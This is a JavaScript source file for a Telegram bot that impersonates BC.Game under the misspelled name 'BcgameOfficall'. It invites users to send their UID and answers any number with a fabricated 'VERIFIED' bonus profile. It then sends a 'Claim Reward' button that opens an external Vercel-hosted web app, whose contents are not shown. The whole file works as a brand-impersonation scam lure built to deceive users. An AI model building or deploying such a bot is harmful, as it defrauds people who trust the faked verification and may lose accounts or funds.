const { Telegraf, Markup } = require('telegraf');
require('dotenv').config();

const bot = new Telegraf(process.env.BOT_TOKEN);

let webUrl = process.env.WEBAPP_URL || 'https://telegrambot-navy.vercel.app/';
if (!webUrl.endsWith('/')) webUrl += '/';

const startImg = `${webUrl}start_image.jpg`;
const uidImg = `${webUrl}uid_image.jpg`;

bot.start(async (ctx) => {
    try {
        await ctx.replyWithPhoto(startImg, {
            caption: `Welcome to BcgameOfficall.\n\nSend your BC.Game UID to verify your VIP status and claim your bonus.`,
            ...Markup.inlineKeyboard([
                [Markup.button.url('Join Channel', 'https://t.me/bcgame_official')]
            ])
        });
    } catch (e) {
        ctx.reply('Welcome to BcgameOfficall.\n\nSend your BC.Game UID to verify your VIP status and claim your bonus.');
    }
});

bot.on('text', async (ctx) => {
    const text = ctx.message.text;
    
    if (/^\d+$/.test(text)) {
        try {
            const profileText = `BC GAME PLAYER PROFILE
━━━━━━━━━━━━━━━━━━━━
👤 Name  : gammaophq
🆔 UID   : ${text}
🥇 Rank  : Beginner
━━━━━━━━━━━━━━━━━━━━
BONUS DETAILS
━━━━━━━━━━━━━━━━━━━━
🎁 ENGINE REWARDS
📌 Status : ✅ VERIFIED
— Claim is available`;

            await ctx.replyWithPhoto(uidImg, {
                caption: profileText,
                ...Markup.inlineKeyboard([
                    [Markup.button.webApp('Claim Reward', webUrl)]
                ])
            });
        } catch (e) {
            ctx.reply(`UID Verified: ${text}\nClick below to claim your reward.`, Markup.inlineKeyboard([
                [Markup.button.webApp('Claim Reward', webUrl)]
            ]));
        }
    } else {
        ctx.reply('Please enter a valid numeric User ID.');
    }
});

bot.launch().then(() => console.log('Bot is running...'));
